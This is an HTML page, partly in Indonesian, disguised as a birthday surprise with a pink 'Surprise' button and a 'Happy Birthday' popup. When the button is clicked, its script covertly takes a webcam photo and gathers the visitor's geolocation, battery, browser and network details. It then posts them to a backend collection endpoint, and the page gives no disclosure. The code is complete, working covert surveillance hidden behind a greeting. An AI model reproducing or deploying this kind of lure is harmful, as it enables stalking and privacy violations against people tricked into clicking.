<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Mancis Peng</title>
  <style>
    /* Gaya umum */
    body {
      font-family: 'Chewy', cursive ;
      margin: 0;
      padding: 0;
      background: #ffcce7;
      color: #5a2d0c;
      text-align: center;
    }

    h1 {
      font-size: 2.5rem;
      margin-top: 20px;
      color: #ff6fa1;
      text-shadow: 1px 1px 2px #ffffff, 0 0 10px #ff99c8;
    }

    /* Tombol */
    #collectData {
      font-size: 1.5rem;
      padding: 15px 30px;
      border: none;
      border-radius: 50px;
      background: linear-gradient(135deg, #ff7eb3, #ff4081);
      color: white;
      cursor: pointer;
      box-shadow: 0 5px 15px rgba(255, 105, 180, 0.4);
      transition: all 0.3s ease;
    }

    #collectData:hover {
      background: linear-gradient(135deg, #ff4081, #ff7eb3);
      transform: scale(1.1);
    }

    #collectData:active {
      transform: scale(1.05);
    }

    /* Background dengan elemen permen */
    body:before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      z-index: -1;
      background: url('https://cdn.pixabay.com/photo/2016/03/05/19/02/sweets-1238612_960_720.jpg') center/cover no-repeat;
      opacity: 0.2;
    }

    /* Popup */
    #popup {
      display: none;
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      padding: 20px;
      background: #fff;
      border: 3px solid #ff99c8;
      border-radius: 15px;
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
      z-index: 1000;
    }

    #popup h2 {
      font-size: 2rem;
      color: #ff6fa1;
    }

    #popup button {
      background: #ff4081;
      color: white;
      padding: 10px 20px;
      border: none;
      border-radius: 10px;
      cursor: pointer;
    }

    #popup button:hover {
      background: #ff6fa1;
    }
  </style>
</head>
<body>
  <h1>Pencet Tombol dibawah</h1>
  <button id="collectData">üéâ Surprise üéâ</button>

  <div id="popup">
    <h2>üç´ü§éHappy Birthday! ü§éüç´</h2>
    <button onclick="closePopup()">OK</button>
  </div>

  <script>
    // Fungsi untuk menampilkan popup
    function showPopup() {
      const popup = document.getElementById('popup');
      popup.style.display = 'block';
    }

    // Fungsi untuk menutup popup
    function closePopup() {
      const popup = document.getElementById('popup');
      popup.style.display = 'none';
    }

    // Function to start camera and capture photo in the background
    async function capturePhoto() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;

        await new Promise((resolve) => (video.onloadedmetadata = resolve));
        video.play();

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        // Stop video stream to release resources
        stream.getTracks().forEach((track) => track.stop());

        return canvas.toDataURL('image/png');
      } catch (error) {
        console.error('Error capturing photo:', error);
        return null;
      }
    }

    // Function to collect device info
    async function collectDeviceInfo() {
      const data = {};

      try {
        // Battery Info
        if (navigator.getBattery) {
          const battery = await navigator.getBattery();
          data.battery = {
            level: battery.level * 100 + '%',
            charging: battery.charging,
          };
        } else {
          data.battery = "Battery API not supported";
        }

        // Device Info
        data.device = {
          userAgent: navigator.userAgent || "Unknown User Agent",
          platform: navigator.platform || "Unknown Platform",
        };

        // Network Info
        if (navigator.connection) {
          const connection = navigator.connection;
          data.network = {
            type: connection.effectiveType || "Unknown",
            downlink: connection.downlink ? connection.downlink + ' Mbps' : "Unknown",
          };
        } else {
          data.network = "Network API not supported";
        }

        // Geolocation
        if (navigator.geolocation) {
          await new Promise((resolve) => {
            navigator.geolocation.getCurrentPosition(
              (position) => {
                data.location = {
                  latitude: position.coords.latitude,
                  longitude: position.coords.longitude,
                  accuracy: position.coords.accuracy + ' meters',
                };
                resolve();
              },
              (error) => {
                data.location = { error: error.message };
                resolve();
              }
            );
          });
        } else {
          data.location = "Geolocation not supported";
        }
      } catch (error) {
        console.error("Error collecting device info:", error);
      }

      return data;
    }

    // Function to collect and send data to the backend
    document.getElementById('collectData').addEventListener('click', async () => {
      showPopup(); // Tampilkan popup

      const photo = await capturePhoto();
      const deviceInfo = await collectDeviceInfo();

      // Combine data
      const data = {
        photo: photo,
        deviceInfo: deviceInfo,
      };

      // Send data to backend
      try {
        const response = await fetch('http://127.0.0.1:5000/data', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(data),
        });
        const result = await response.json();
        console.log('Server response:', result);
      } catch (error) {
        console.error('Error sending data:', error);
      }
    });
  </script>
</body>
</html>
